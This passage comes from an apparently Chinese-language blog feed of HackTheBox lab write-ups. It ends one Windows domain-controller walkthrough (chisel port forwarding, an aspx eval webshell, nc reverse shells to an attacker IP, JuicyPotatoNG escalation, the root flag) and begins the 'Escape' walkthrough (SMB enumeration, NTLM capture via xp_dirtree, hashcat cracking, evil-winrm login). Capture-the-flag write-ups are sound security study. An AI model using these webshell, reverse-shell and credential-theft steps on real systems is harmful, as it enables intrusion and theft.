class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">Host Name:                 G0</span><br><span class="line">OS Name:                   Microsoft Windows Server 2019 Standard</span><br><span class="line">OS Version:                10.0.17763 N&#x2F;A Build 17763</span><br><span class="line">OS Manufacturer:           Microsoft Corporation</span><br><span class="line">OS Configuration:          Primary Domain Controller</span><br><span class="line">OS Build Type:             Multiprocessor Free</span><br><span class="line">Registered Owner:          Windows User</span><br><span class="line">Registered Organization:   </span><br><span class="line">Product ID:                00429-00521-62775-AA402</span><br><span class="line">Original Install Date:     7&#x2F;20&#x2F;2021, 11:21:49 AM</span><br><span class="line">System Boot Time:          3&#x2F;10&#x2F;2023, 7:46:45 AM</span><br><span class="line">System Manufacturer:       VMware, Inc.</span><br><span class="line">System Model:              VMware7,1</span><br><span class="line">System Type:               x64-based PC</span><br><span class="line">Processor(s):              2 Processor(s) Installed.</span><br><span class="line">                           [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz</span><br><span class="line">                           [02]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz</span><br><span class="line">BIOS Version:              VMware, Inc. VMW71.00V.16707776.B64.2008070230, 8&#x2F;7&#x2F;2020</span><br><span class="line">Windows Directory:         C:\Windows</span><br><span class="line">System Directory:          C:\Windows\system32</span><br><span class="line">Boot Device:               \Device\HarddiskVolume3</span><br><span class="line">System Locale:             en-us;English (United States)</span><br><span class="line">Input Locale:              it;Italian (Italy)</span><br><span class="line">Time Zone:                 (UTC-08:00) Pacific Time (US &amp; Canada)</span><br><span class="line">Total Physical Memory:     4,095 MB</span><br><span class="line">Available Physical Memory: 2,046 MB</span><br><span class="line">Virtual Memory: Max Size:  5,503 MB</span><br><span class="line">Virtual Memory: Available: 3,361 MB</span><br><span class="line">Virtual Memory: In Use:    2,142 MB</span><br><span class="line">Page File Location(s):     C:\pagefile.sys</span><br><span class="line">Domain:                    flight.htb</span><br><span class="line">Logon Server:              N&#x2F;A</span><br><span class="line">Hotfix(s):                 N&#x2F;A</span><br><span class="line">Network Card(s):           1 NIC(s) Installed.</span><br><span class="line">                           [01]: vmxnet3 Ethernet Adapter</span><br><span class="line">                                 Connection Name: Ethernet0 2</span><br><span class="line">                                 DHCP Enabled:    No</span><br><span class="line">                                 IP address(es)</span><br><span class="line">                                 [01]: 10.10.11.187</span><br><span class="line">                                 [02]: fe80::c88d:96af:ef3d:fb9f</span><br><span class="line">                                 [03]: dead:beef::c88d:96af:ef3d:fb9f</span><br><span class="line">                                 [04]: dead:beef::250</span><br><span class="line">Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.</span><br></pre></td></tr></table></figure><p>查看TCP监听端口</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ant | <span class="built_in">findstr</span> TCP | <span class="built_in">findstr</span> <span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       InHost      </span><br><span class="line">TCP    0.0.0.0:88             0.0.0.0:0              LISTENING       InHost      </span><br><span class="line">TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       InHost      </span><br><span class="line">TCP    0.0.0.0:389            0.0.0.0:0              LISTENING       InHost      </span><br><span class="line">TCP    0.0.0.0:443            0.0.0.0:0              LISTENING       InHost      </span><br><span class="line">TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       InHost      </span><br><span class="line">TCP    0.0.0.0:464            0.0.0.0:0              LISTENING       InHost      </span><br><span class="line">TCP    0.0.0.0:593            0.0.0.0:0              LISTENING       InHost      </span><br><span class="line">TCP    0.0.0.0:636            0.0.0.0:0              LISTENING       InHost      </span><br><span class="line">TCP    0.0.0.0:3268           0.0.0.0:0              LISTENING       InHost      </span><br><span class="line">TCP    0.0.0.0:3269           0.0.0.0:0              LISTENING       InHost      </span><br><span class="line">TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       InHost      </span><br><span class="line">TCP    0.0.0.0:8000           0.0.0.0:0              LISTENING       InHost      </span><br><span class="line">TCP    0.0.0.0:9389           0.0.0.0:0              LISTENING       InHost      </span><br><span class="line">TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       InHost      </span><br><span class="line">TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       InHost      </span><br><span class="line">TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       InHost      </span><br><span class="line">TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       InHost      </span><br><span class="line">TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       InHost      </span><br><span class="line">TCP    0.0.0.0:49673          0.0.0.0:0              LISTENING       InHost      </span><br><span class="line">TCP    0.0.0.0:49674          0.0.0.0:0              LISTENING       InHost      </span><br><span class="line">TCP    0.0.0.0:49690          0.0.0.0:0              LISTENING       InHost      </span><br><span class="line">TCP    0.0.0.0:49693          0.0.0.0:0              LISTENING       InHost      </span><br><span class="line">TCP    0.0.0.0:49702          0.0.0.0:0              LISTENING       InHost      </span><br><span class="line">TCP    10.10.11.187:53        0.0.0.0:0              LISTENING       InHost      </span><br><span class="line">TCP    10.10.11.187:139       0.0.0.0:0              LISTENING       InHost      </span><br><span class="line">TCP    127.0.0.1:53           0.0.0.0:0              LISTENING       InHost</span><br></pre></td></tr></table></figure><p>与nmap扫描结果对比好像多了个8000？</p><p>本机上测试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -I -v http://10.10.11.187:8000/</span><br></pre></td></tr></table></figure><p>没有响应</p><p>靶机上测试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl http://0.0.0.0:8000/</span><br><span class="line">curl : Unable to connect to the remote server</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl http://127.0.0.1:8000/</span><br><span class="line">curl : &lt;!DOCTYPE html PUBLIC <span class="string">&quot;-//W3C//DTD XHTML 1.0 Strict//EN&quot;</span> <span class="string">&quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd&quot;</span>&gt; </span><br></pre></td></tr></table></figure><p>估计是要做个端口转发了</p><p><s>用LCX搭端口转发死活搭不上，麻了</s></p><blockquote><p><a href="https://github.com/jpillora/chisel">https://github.com/jpillora/chisel</a></p></blockquote><p>本机运行服务端，开启HTTP服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./chisel_1.8.1_linux_amd64 server -p 8888 --reverse &amp;</span><br><span class="line">python -m http.server 80</span><br></pre></td></tr></table></figure><p>下载并运行客户端</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Invoke-WebRequest -Uri &quot;http://<span class="number">10</span>.<span class="number">10</span>.*.*/chisel_1.<span class="number">8</span>.<span class="number">1</span>_windows_amd64&quot; -OutFile &quot;./chisel.exe&quot;</span><br><span class="line">./chisel.exe client <span class="number">10</span>.<span class="number">10</span>.*.*:<span class="number">8888</span> R:<span class="number">8000</span>:<span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">8000</span></span><br></pre></td></tr></table></figure><p>将客户端的127.0.0.1:8000转发至服务端0.0.0.0:8000</p><p>访问<code>http://0.0.0.0:8000/</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Physical Path   C:\inetpub\development</span><br></pre></td></tr></table></figure><p>IIS服务，得到路径</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">dir</span> c:\inetpub\development</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">    Directory: C:\inetpub\development</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----</span><br><span class="line">d-----        3&#x2F;11&#x2F;2023  12:52 PM                development </span><br></pre></td></tr></table></figure><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">dir</span> C:\inetpub\development\development</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">    Directory: C:\inetpub\development\development</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----</span><br><span class="line">d-----        3&#x2F;11&#x2F;2023  12:52 PM                css</span><br><span class="line">d-----        3&#x2F;11&#x2F;2023  12:52 PM                fonts</span><br><span class="line">d-----        3&#x2F;11&#x2F;2023  12:52 PM                img</span><br><span class="line">d-----        3&#x2F;11&#x2F;2023  12:52 PM                js</span><br><span class="line">-a----        4&#x2F;16&#x2F;2018   2:23 PM           9371 contact.html</span><br><span class="line">-a----        4&#x2F;16&#x2F;2018   2:23 PM          45949 index.html</span><br></pre></td></tr></table></figure><p>尝试了以下，对路径有写权限</p><p>写入aspx WebShell</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set</span>-Content -<span class="built_in">Path</span> &quot;C:\inetpub\development\development\BFL.aspx&quot; -Value &#x27;&lt;%@ Page Language=&quot;Jscript&quot;<span class="variable">%&gt;&lt;%</span>eval(Request.Item[&quot;BFL&quot;],&quot;unsafe&quot;);%&gt;&#x27;</span><br></pre></td></tr></table></figure><p>蚁剑连接后上传nc.exe</p><p><s>一开始找个nc不支持-e选项，笑嘻了</s></p><p>监听</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9997</span><br></pre></td></tr></table></figure><p>反弹Shell</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cmd</span> /c <span class="built_in">start</span> nc.exe -e <span class="built_in">cmd</span> <span class="number">10</span>.<span class="number">10</span>.<span class="number">16</span>.<span class="number">12</span> <span class="number">9997</span></span><br></pre></td></tr></table></figure><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami /priv</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">PRIVILEGES INFORMATION</span><br><span class="line">----------------------</span><br><span class="line"></span><br><span class="line">Privilege Name                Description                               State   </span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled</span><br><span class="line">SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled</span><br><span class="line">SeMachineAccountPrivilege     Add workstations to domain                Disabled</span><br><span class="line">SeAuditPrivilege              Generate security audits                  Disabled</span><br><span class="line">SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled </span><br><span class="line">SeImpersonatePrivilege        Impersonate a client after authentication Enabled </span><br><span class="line">SeCreateGlobalPrivilege       Create global objects                     Enabled </span><br><span class="line">SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled</span><br></pre></td></tr></table></figure><p><code>SeImpersonatePrivilege</code>，一眼juicypotato</p><p>老的juicypotato好像对<code>Microsoft Windows Server 2019 Standard</code>无效</p><p>下载JuicyPotatoNG，解压并开启http服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/antonioCoco/JuicyPotatoNG/releases/download/v1.1/JuicyPotatoNG.zip</span><br><span class="line">unzip JuicyPotatoNG.zip</span><br><span class="line">python -m http.server 80</span><br></pre></td></tr></table></figure><p>监听</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9995</span><br></pre></td></tr></table></figure><p>下载JuicyPotatoNG.exe和nc.exe，运行juicypotatong</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">powershell</span><br><span class="line">Invoke-WebRequest -Uri &quot;http://<span class="number">10</span>.<span class="number">10</span>.<span class="number">16</span>.<span class="number">12</span>/JuicyPotatoNG.exe&quot; -OutFile &quot;./JuicyPotatoNG.exe&quot;</span><br><span class="line">Invoke-WebRequest -Uri &quot;http://<span class="number">10</span>.<span class="number">10</span>.<span class="number">16</span>.<span class="number">12</span>/nc.exe&quot; -OutFile &quot;./nc.exe&quot;</span><br><span class="line">./juicypotatoNG.exe -t t -p &quot;./nc.exe&quot; -a &quot;-e <span class="built_in">cmd</span> <span class="number">10</span>.<span class="number">10</span>.*.* <span class="number">9995</span></span><br></pre></td></tr></table></figure><p>获得反弹shell，查看root.txt</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> c:\users\administrator\desktop\root.txt</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f54fcef08f4ea67c6c7b406b2170b354</span><br></pre></td></tr></table></figure><hr /><blockquote><p>端口转发工具</p></blockquote><p>之前的lcx工具弄丢了，现在找的交叉编译跟Windows环境编译都能通过，但是都用不了</p><blockquote><p><a href="https://github.com/windworst/LCX">https://github.com/windworst/LCX</a><br /><a href="https://github.com/AA8j/SecTools/raw/main/lcx/lcx.exe">https://github.com/AA8j/SecTools/raw/main/lcx/lcx.exe</a></p></blockquote><p>搞半天连不通<br />网上找下第一个编译成elf第二个直接用还能连上，就这样吧</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;Nice one.&lt;/p&gt;</summary>
    
    
    
    <category term="WriteUp" scheme="https://yoloyolo.top/categories/WriteUp/"/>
    
    
    <category term="Pentest" scheme="https://yoloyolo.top/tags/Pentest/"/>
    
    <category term="HackTheBox" scheme="https://yoloyolo.top/tags/HackTheBox/"/>
    
  </entry>
  
  <entry>
    <title>HackTheBox_Escape</title>
    <link href="https://yoloyolo.top/2023/03/09/HackTheBox-Escape/"/>
    <id>https://yoloyolo.top/2023/03/09/HackTheBox-Escape/</id>
    <published>2023-03-08T18:28:44.000Z</published>
    <updated>2023-03-08T19:10:42.841Z</updated>
    
    <content type="html"><![CDATA[<p>域渗透水平还是一如既往的差</p><a id="more"></a><h1 id="hackthebox_escape"><a class="markdownIt-Anchor" href="#hackthebox_escape"></a> HackTheBox_Escape</h1><h2 id="信息收集"><a class="markdownIt-Anchor" href="#信息收集"></a> 信息收集</h2><h3 id="端口扫描"><a class="markdownIt-Anchor" href="#端口扫描"></a> 端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 1-10000 -sV -T5 -v 10.10.11.202</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 10.10.11.202</span><br><span class="line">Host is up (0.24s latency).</span><br><span class="line">Not shown: 9986 filtered ports</span><br><span class="line">PORT     STATE SERVICE       VERSION</span><br><span class="line">53&#x2F;tcp   open  domain?</span><br><span class="line">88&#x2F;tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-03-08 22:14:40Z)</span><br><span class="line">135&#x2F;tcp  open  msrpc         Microsoft Windows RPC</span><br><span class="line">139&#x2F;tcp  open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389&#x2F;tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)</span><br><span class="line">445&#x2F;tcp  open  microsoft-ds?</span><br><span class="line">464&#x2F;tcp  open  kpasswd5?</span><br><span class="line">593&#x2F;tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636&#x2F;tcp  open  ssl&#x2F;ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)</span><br><span class="line">1433&#x2F;tcp open  ms-sql-s      Microsoft SQL Server</span><br><span class="line">3268&#x2F;tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)</span><br><span class="line">3269&#x2F;tcp open  ssl&#x2F;ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)</span><br><span class="line">5985&#x2F;tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP&#x2F;UPnP)</span><br><span class="line">9389&#x2F;tcp open  mc-nmf        .NET Message Framing</span><br><span class="line">2 services unrecognized despite returning data. If you know the service&#x2F;version, please submit the following fingerprints at https:&#x2F;&#x2F;nmap.org&#x2F;cgi-bin&#x2F;submit.cgi?new-service :</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">SF-Port53-TCP:V&#x3D;7.80%I&#x3D;7%D&#x3D;3&#x2F;8%Time&#x3D;64089A0A%P&#x3D;x86_64-pc-linux-gnu%r(DNSVe</span><br><span class="line">SF:rsionBindReqTCP,20,&quot;\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\x</span><br><span class="line">SF:04bind\0\0\x10\0\x03&quot;);</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">SF-Port1433-TCP:V&#x3D;7.80%I&#x3D;7%D&#x3D;3&#x2F;8%Time&#x3D;64089A0B%P&#x3D;x86_64-pc-linux-gnu%r(ms-</span><br><span class="line">SF:sql-s,25,&quot;\x04\x01\0%\0\0\x01\0\0\0\x15\0\x06\x01\0\x1b\0\x01\x02\0\x1c</span><br><span class="line">SF:\0\x01\x03\0\x1d\0\0\xff\x0f\0\x07\xd0\0\0\0\0&quot;);</span><br><span class="line">Service Info: Host: DC; OS: Windows; CPE: cpe:&#x2F;o:microsoft:windows</span><br></pre></td></tr></table></figure><h2 id="漏洞利用"><a class="markdownIt-Anchor" href="#漏洞利用"></a> 漏洞利用</h2><p>枚举SMB分享路径</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbmap -H 10.10.11.202 -u <span class="built_in">test</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[+] Guest session   IP: 10.10.11.202:445Name: 10.10.11.202                                      </span><br><span class="line">        Disk                                                  PermissionsComment</span><br><span class="line">----                                                  ------------------</span><br><span class="line">ADMIN$                                            NO ACCESSRemote Admin</span><br><span class="line">C$                                                NO ACCESSDefault share</span><br><span class="line">IPC$                                              READ ONLYRemote IPC</span><br><span class="line">NETLOGON                                          NO ACCESSLogon server share </span><br><span class="line">Public                                            READ ONLY</span><br><span class="line">SYSVOL                                            NO ACCESSLogon server share</span><br></pre></td></tr></table></figure><p>匿名登入路径<code>/Public</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">smbclient //10.10.11.202/Public</span><br><span class="line">ls</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.                                   D        0  Sat Nov 19 06:51:25 2022</span><br><span class="line">..                                  D        0  Sat Nov 19 06:51:25 2022</span><br><span class="line">SQL Server Procedures.pdf           A    49551  Fri Nov 18 08:39:43 2022</span><br><span class="line"></span><br><span class="line">5184255 blocks of size 4096. 1468811 blocks available</span><br></pre></td></tr></table></figure><p>下载文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">get <span class="string">&quot;SQL Server Procedures.pdf&quot;</span></span><br><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></table></figure><p>得到MSSQL登入凭证</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PublicUser:GuestUserCantWrite1</span><br></pre></td></tr></table></figure><p>登入MSSQL服务并启用responder</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python mssqlclient.py PublicUser:GuestUserCantWrite1@10.10.11.202</span><br><span class="line">responder -I tun0 -A</span><br></pre></td></tr></table></figure><p>访问responder</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec master.dbo.xp_dirtree &#x27;\\<span class="number">10</span>.<span class="number">10</span>.*.*\BFL&#x27;</span><br></pre></td></tr></table></figure><p>获得NTLMv2如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SQL_SVC::sequel:8ac23c4c29037047:e9eda6f3888b9877036279efea3cb3c0:01010000000000000090858da351d901e3f5635e3fb70b460000000002000800510059004200330001001e00570049004e002d00550053004d0032005a0036003600370048005300300004003400570049004e002d00550053004d0032005a003600360037004800530030002e0051005900420033002e004c004f00430041004c000300140051005900420033002e004c004f00430041004c000500140051005900420033002e004c004f00430041004c00070008000090858da351d90106000400020000000800300030000000000000000000000000300000f4ab4ae3d13aea1739c364c66324ca7ba193602fb63935e338e10f1745d4aa2a0a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e0032000000000000000000</span><br></pre></td></tr></table></figure><p>hashcat爆破</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;SQL_SVC::sequel:8ac23c4c29037047:e9eda6f3888b9877036279efea3cb3c0:01010000000000000090858da351d901e3f5635e3fb70b460000000002000800510059004200330001001e00570049004e002d00550053004d0032005a0036003600370048005300300004003400570049004e002d00550053004d0032005a003600360037004800530030002e0051005900420033002e004c004f00430041004c000300140051005900420033002e004c004f00430041004c000500140051005900420033002e004c004f00430041004c00070008000090858da351d90106000400020000000800300030000000000000000000000000300000f4ab4ae3d13aea1739c364c66324ca7ba193602fb63935e338e10f1745d4aa2a0a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e0032000000000000000000&#x27;</span> &gt; <span class="built_in">hash</span></span><br><span class="line">hashcat -m 5600 <span class="built_in">hash</span> /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure><p>明文如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REGGIE1234ronnie</span><br></pre></td></tr></table></figure><p>以sql_svc用户登入winrm服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 10.10.11.202 -u sql_svc -p REGGIE1234ronnie</span><br></pre></td></tr></table></figure><p>启用smb服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python smbserver.py BFL /tmp/ -smb2support</span><br></pre></td></tr></table></figure><p>回传文件</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">copy</span>-item -<span class="built_in">path</span> c:\sqlserver\logs\errorlog.bak -destination &#x27;\\<span class="number">10</span>.<span class="number">10</span>.*.*\BFL\&#x27;</span><br></pre></td></tr></table></figure><p>根据日志文件中的信息添加两个域名解析</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;10.10.11.202\tdc.sequel.htb&quot;</span> &gt;&gt; /etc/hosts</span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;10.10.11.202\tsequel.htb&quot;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure><p>日志文件中存在两条登录信息如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">2022-11-18 13:43:07.44 Logon       Error: 18456, Severity: 14, State: 8.</span><br><span class="line">2022-11-18 13:43:07.44 Logon       Logon failed for user &#39;sequel.htb\Ryan.Cooper&#39;. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]</span><br><span class="line">2022-11-18 13:43:07.48 Logon       Error: 18456, Severity: 14, State: 8.</span><br><span class="line">2022-11-18 13:43:07.48 Logon       Logon failed for user &#39;NuclearMosquito3&#39;. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]</span><br></pre></td></tr></table></figure><p>查看用户信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span 